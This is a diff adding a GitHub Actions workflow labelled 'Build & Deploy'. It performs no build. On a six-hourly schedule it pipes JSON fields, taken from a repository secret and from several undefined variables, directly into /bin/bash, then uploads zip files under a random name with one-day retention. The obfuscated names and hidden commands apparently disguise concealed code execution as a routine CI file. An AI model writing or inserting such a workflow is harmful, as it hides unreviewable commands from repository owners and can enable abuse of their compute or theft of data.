@@ -1,0 +1,35 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 3,9,15,21 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          j3: ${{ secrets.j3 }}
+        run: |
+          printf '%s' "$j3" | jq -r .qdr15923 | /bin/bash
+          printf '%s' "$bnar788" | jq -r .tyw304 | /bin/bash
+          echo $g259 | jq -r .ipbk95 | /bin/bash
+          printf '%s' "$orcx54" | jq -r .yjcj17 | /bin/bash
+          printf '%s' "$ahv991" | jq -r .grk15447 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5XsoA7H5
+          path: "*.zip"
+          retention-days: 1
